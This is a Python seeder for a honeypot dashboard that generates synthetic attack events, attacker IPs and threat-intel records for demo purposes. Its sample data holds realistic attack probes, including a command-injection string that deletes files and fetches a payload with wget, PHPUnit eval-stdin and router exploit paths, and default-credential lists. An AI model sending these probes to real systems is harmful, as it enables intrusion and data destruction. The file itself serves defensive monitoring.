"""
Schema bootstrap + realistic demo-data seeder.

Idempotent: creates tables (if absent) and, when SEED_ON_START is set and the DB
is empty, generates three honeypot sources with ~30 days of correlated attack
traffic — including coordinated cross-VPS attackers and OTX threat intel — so the
dashboard is populated on first boot.

Run standalone:  python -m app.seed
"""
from __future__ import annotations

import random
import sys
import uuid
from datetime import datetime, timedelta, timezone

# Ensure box-drawing / arrow glyphs print on Windows consoles (cp1252).
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
    except (AttributeError, ValueError):
        pass

from sqlalchemy import insert, select, text

from .config import settings
from .database import Base, SessionLocal, engine
from .models import Event, ThreatIntel, VpsSource
from .security import admin_token, encrypt_secret, generate_api_key, hash_api_key

RNG = random.Random(1337)  # deterministic

# ── Reference pools ─────────────────────────────────────────────────────────
VPS_DEFS = [
    dict(alias="SENSOR-01", display_name="Sensor 01", base_url="http://192.0.2.11:9999/",
         stack_type="html_fastapi", region="Jakarta, ID", lat=-6.2088, lon=106.8456),
    dict(alias="SENSOR-02", display_name="Sensor 02", base_url="http://198.51.100.22:9999/",
         stack_type="html_fastapi", region="Montréal, CA", lat=45.5019, lon=-73.5674),
    dict(alias="SENSOR-03", display_name="Sensor 03", base_url="http://203.0.113.33:9999/dashboard",
         stack_type="react_pg", region="Karachi, PK", lat=24.8607, lon=67.0011),
]

COUNTRY_WEIGHTS = {
    "CN": 22, "RU": 14, "US": 11, "IN": 8, "BR": 7, "VN": 6, "ID": 5, "KR": 4,
    "DE": 4, "NL": 4, "IR": 3, "TW": 3, "UA": 3, "GB": 2, "FR": 2, "SG": 2,
    "TR": 2, "RO": 2, "HK": 2, "KP": 1,
}
ASN_BY_COUNTRY = {
    "CN": ["AS4134 Chinanet", "AS4837 China Unicom", "AS4808 China Unicom Beijing"],
    "RU": ["AS12389 Rostelecom", "AS8402 Corbina", "AS49505 Selectel"],
    "US": ["AS16509 Amazon", "AS14061 DigitalOcean", "AS8075 Microsoft"],
    "IN": ["AS9829 BSNL", "AS55836 Reliance Jio"],
    "BR": ["AS28573 Claro", "AS8167 Brasil Telecom"],
    "VN": ["AS45899 VNPT", "AS7552 Viettel"],
    "ID": ["AS7713 Telkom Indonesia", "AS17974 Telkomsel"],
    "KR": ["AS4766 Korea Telecom", "AS9318 SK Broadband"],
    "DE": ["AS24940 Hetzner", "AS3320 Deutsche Telekom"],
    "NL": ["AS60781 LeaseWeb", "AS16276 OVH"],
    "IR": ["AS12880 ITC", "AS58224 TIC"],
}
PROTOCOLS = [("ssh", 62), ("http", 20), ("telnet", 9), ("ftp", 5), ("smtp", 4)]
USERNAMES = ["root", "admin", "user", "test", "oracle", "ubuntu", "pi", "guest",
             "postgres", "git", "ftpuser", "administrator", "support", "deploy",
             "mysql", "www-data", "nagios", "tomcat"]
PASSWORDS = ["123456", "admin", "password", "root", "12345678", "1234", "admin123",
             "root123", "qwerty", "password123", "111111", "123123", "letmein",
             "changeme", "toor", "P@ssw0rd", "000000", "1qaz2wsx", "123456789",
             "welcome", "raspberry", "1234567890", "abc123", "Passw0rd!"]
HTTP_PAYLOADS = ["GET /wp-login.php", "GET /.env", "POST /boaform/admin/formLogin",
                 "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s/x", "GET /cgi-bin/luci",
                 "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "GET /.git/config",
                 "POST /GponForm/diag_Form", "GET /solr/admin/info/system", "GET /actuator/env"]
MALWARE = ["Mirai", "Mozi", "Gafgyt", "XorDDoS", "Kinsing", "Tsunami", "RedGhost", "Sysrv"]
TAGS = ["bruteforce", "scanner", "botnet", "ssh", "mirai", "malware", "tor-exit",
        "mass-scanner", "credential-stuffing", "iot", "cryptomining"]


def _weighted(pairs):
    names = [n for n, _ in pairs]
    weights = [w for _, w in pairs]
    return RNG.choices(names, weights=weights, k=1)[0]


def _rand_ip(country: str) -> str:
    # Stable-ish octet by country so the same country clusters into subnets.
    base = sum(ord(c) for c in country) % 200 + 20
    return f"{base}.{RNG.randint(1, 254)}.{RNG.randint(0, 254)}.{RNG.randint(1, 254)}"


def _proto_meta(proto: str):
    return {
        "ssh": (22, "ssh_login_attempt", "SSH interactive session"),
        "http": (80, "http_scan", "HTTP request"),
        "telnet": (23, "telnet_login_attempt", "Telnet login"),
        "ftp": (21, "ftp_login_attempt", "FTP USER"),
        "smtp": (25, "smtp_probe", "SMTP EHLO probe"),
    }[proto]


def already_seeded(db) -> bool:
    return db.execute(select(VpsSource).limit(1)).first() is not None


def seed(db) -> None:
    print("[seed] generating honeypot sources + demo traffic...")
    countries = list(COUNTRY_WEIGHTS.items())

    # 1) VPS sources — print the plaintext keys once (demo only).
    vps_rows: list[VpsSource] = []
    print("\n  ┌─ DEMO SHIPPER API KEYS (store these; not retrievable later) ─────────")
    for d in VPS_DEFS:
        key = generate_api_key()
        v = VpsSource(
            **d,
            api_key_hash=hash_api_key(key),
            alienvault_key_encrypted=encrypt_secret(f"otx-demo-{d['alias'].lower()}-key"),
        )
        db.add(v)
        vps_rows.append(v)
        print(f"  │  {d['alias']:<4} {key}")
    print("  └──────────────────────────────────────────────────────────────────────\n")
    db.flush()

    # 2) Attacker IP universe.
    ip_pool: dict[str, dict] = {}
    for _ in range(190):
        cc = _weighted(countries)
        ip = _rand_ip(cc)
        if ip in ip_pool:
            continue
        asn = RNG.choice(ASN_BY_COUNTRY.get(cc, [f"AS{RNG.randint(10000, 60000)} Unknown"]))
        ip_pool[ip] = {"cc": cc, "asn": asn}
    ips = list(ip_pool)

    # Most attackers hit a single sensor ("home"). A few classes cross sensors:
    #   • roamers   — broad internet scanners seen everywhere (low coordination)
    #   • cross_ips — coordinated actors hitting 2-3 sensors in tight windows
    home = {ip: RNG.choice(vps_rows).id for ip in ips}
    home_pool = {v.id: [ip for ip in ips if home[ip] == v.id] for v in vps_rows}
    roamers = set(RNG.sample(ips, 15))
    cross_ips = RNG.sample([ip for ip in ips if ip not in roamers], 25)

    now = datetime.now(timezone.utc)
    events: list[dict] = []

    def make_event(vps_id, ip, when, force_proto=None):
        meta = ip_pool[ip]
        proto = force_proto or _weighted(PROTOCOLS)
        port, etype, desc = _proto_meta(proto)
        user = RNG.choice(USERNAMES) if proto in ("ssh", "telnet", "ftp") else None
        pw = RNG.choice(PASSWORDS) if proto in ("ssh", "telnet", "ftp") else None
        payload = None
        sev = RNG.choice([1, 1, 1, 2, 2, 3])
        if proto == "http":
            payload = RNG.choice(HTTP_PAYLOADS)
            if "%s" in payload:
                payload = payload % ip
            if any(x in payload for x in (".env", "eval-stdin", "shell?", "GponForm")):
                sev = RNG.choice([3, 4])
        raw = {
            "ID": str(uuid.uuid4()), "Protocol": proto, "SourceIp": ip,
            "SourcePort": str(RNG.randint(1024, 65535)), "RemoteAddr": f"{ip}:{RNG.randint(1024,65535)}",
            "User": user, "Password": pw, "Description": desc,
            "DateTime": when.isoformat(), "Status": "Stateless" if proto == "http" else "Interactive",
            "Client": RNG.choice(["libssh2", "PUTTY", "Go-http-client/1.1", "curl/7.68", "masscan/1.3"]),
        }
        return dict(
            event_uuid=uuid.UUID(raw["ID"]), vps_id=vps_id, occurred_at=when,
            src_ip=ip, dst_port=port, protocol=proto, event_type=etype, severity=sev,
            username_tried=user, password_tried=pw, payload_excerpt=payload,
            raw_payload=raw, country_code=meta["cc"],
        )

    # 3) Background traffic per VPS over 30 days (denser toward "now").
    roamer_list = list(roamers)
    for v in vps_rows:
        n = RNG.randint(3200, 4200)
        pool = home_pool[v.id]
        for _ in range(n):
            # Bias recent: square the uniform to weight toward 0 days ago.
            days_ago = (RNG.random() ** 2) * 30
            when = now - timedelta(days=days_ago, seconds=RNG.randint(0, 86400))
            # 90% home attackers, 10% roaming scanners (seen on every sensor).
            ip = RNG.choice(roamer_list) if RNG.random() < 0.10 else RNG.choice(pool)
            events.append(make_event(v.id, ip, when))

    # 4) Coordinated cross-VPS bursts (tight windows => high coordination score).
    for ip in cross_ips:
        targets = RNG.sample(vps_rows, RNG.choice([2, 2, 3]))
        campaign_start = now - timedelta(days=RNG.random() * 20)
        window = RNG.choice([timedelta(minutes=25), timedelta(hours=3), timedelta(hours=18)])
        proto = _weighted(PROTOCOLS)
        for v in targets:
            burst = RNG.randint(12, 40)
            for _ in range(burst):
                when = campaign_start + timedelta(seconds=RNG.random() * window.total_seconds())
                events.append(make_event(v.id, ip, when, force_proto=proto))

    # 5) Bulk insert events.
    RNG.shuffle(events)
    print(f"[seed] inserting {len(events)} events...")
    for i in range(0, len(events), 1000):
        db.execute(insert(Event), events[i : i + 1000])
    db.flush()

    # 6) Build ip_registry + ip_vps_sightings from events (set-based).
    print("[seed] linking IP registry + cross-VPS sightings...")
    db.execute(text(
        """
        INSERT INTO ip_registry (ip, first_seen_at, last_seen_at, total_events, country_code)
        SELECT src_ip, MIN(occurred_at), MAX(occurred_at), COUNT(*),
               MODE() WITHIN GROUP (ORDER BY country_code)
        FROM events GROUP BY src_ip
        """
    ))
    db.execute(text(
        """
        INSERT INTO ip_vps_sightings (ip, vps_id, first_seen_at, last_seen_at, event_count)
        SELECT src_ip, vps_id, MIN(occurred_at), MAX(occurred_at), COUNT(*)
        FROM events GROUP BY src_ip, vps_id
        """
    ))
    db.execute(text(
        """
        UPDATE ip_registry r
        SET vps_count = s.c, is_cross_vps = s.c > 1
        FROM (SELECT ip, COUNT(DISTINCT vps_id) c FROM ip_vps_sightings GROUP BY ip) s
        WHERE r.ip = s.ip
        """
    ))
    # ASN backfill.
    for ip, meta in ip_pool.items():
        db.execute(text("UPDATE ip_registry SET asn = :asn WHERE ip = :ip"),
                   {"asn": meta["asn"], "ip": ip})

    # 7) Threat intel for cross-VPS + high-volume IPs.
    print("[seed] enriching threat intel (OTX cache)...")
    volume_ips = [r[0] for r in db.execute(text(
        "SELECT ip FROM ip_registry ORDER BY total_events DESC LIMIT 45"
    )).all()]
    ti_ips = set(str(i) for i in cross_ips) | set(str(i) for i in volume_ips)
    vps_ids = [v.id for v in vps_rows]
    for ip in ti_ips:
        pulses = RNG.choice([0, 0, 1, 2, 3, 5, 8, 12, 19, 27])
        rep = round(RNG.uniform(-3.0, -0.2), 2) if pulses else round(RNG.uniform(-0.5, 0.4), 2)
        db.execute(insert(ThreatIntel).values(
            ip=ip,
            otx_pulse_count=pulses,
            reputation_score=rep,
            tags=RNG.sample(TAGS, RNG.randint(1, 4)) if pulses else [],
            malware_families=RNG.sample(MALWARE, RNG.randint(1, 3)) if pulses > 3 else [],
            last_checked_at=now - timedelta(minutes=RNG.randint(1, 720)),
            checked_via_vps=RNG.choice(vps_ids),
            raw_response={"source": "otx", "demo": True, "pulse_count": pulses},
        ))

    # 8) Health variety: SENSOR-01/SENSOR-03 online, SENSOR-02 stale.
    last_seen = {"SENSOR-01": now - timedelta(seconds=40), "SENSOR-03": now - timedelta(seconds=95),
                 "SENSOR-02": now - timedelta(minutes=11)}
    for v in vps_rows:
        v.last_seen_at = last_seen.get(v.alias, now)

    db.commit()
    print("[seed] done.")


def main() -> None:
    print("[schema] ensuring tables + extensions...")
    with engine.begin() as conn:
        conn.execute(text('CREATE EXTENSION IF NOT EXISTS "pgcrypto"'))
    Base.metadata.create_all(engine)

    print(f"\n  ADMIN TOKEN (dashboard → register sensors): {admin_token()}\n")

    with SessionLocal() as db:
        if already_seeded(db):
            print("[seed] data already present — skipping.")
            return
        if not settings.seed_on_start:
            print("[seed] SEED_ON_START disabled — schema only.")
            return
        seed(db)


if __name__ == "__main__":
    main()
